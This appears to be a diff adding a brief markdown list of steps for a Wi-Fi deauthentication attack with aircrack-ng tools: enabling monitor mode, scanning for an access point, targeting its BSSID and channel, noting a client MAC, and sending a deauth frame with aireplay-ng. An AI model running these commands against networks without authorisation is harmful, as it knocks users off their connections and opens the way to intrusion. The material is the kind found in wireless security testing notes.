@@ -1,0 +1,10 @@
+### Steps
+
+  1. &gt;airmon-ng start &lt;interface&gt;
+  2. &gt;airodump-ng &lt;mon_int&gt;
+  3. Copy down the bssid of the ap
+  4. &gt;airodump-ng &lt;mon_int&gt; \--bssid &lt;ap_bssid&gt; \--channel &lt;No&gt;
+  5. Wait for the client to connect to the ap and note the MAC address
+  6. &gt;aireplay-ng --deauth 1 -a &lt;target_mac&gt; &lt;mon_int&gt;
+
+
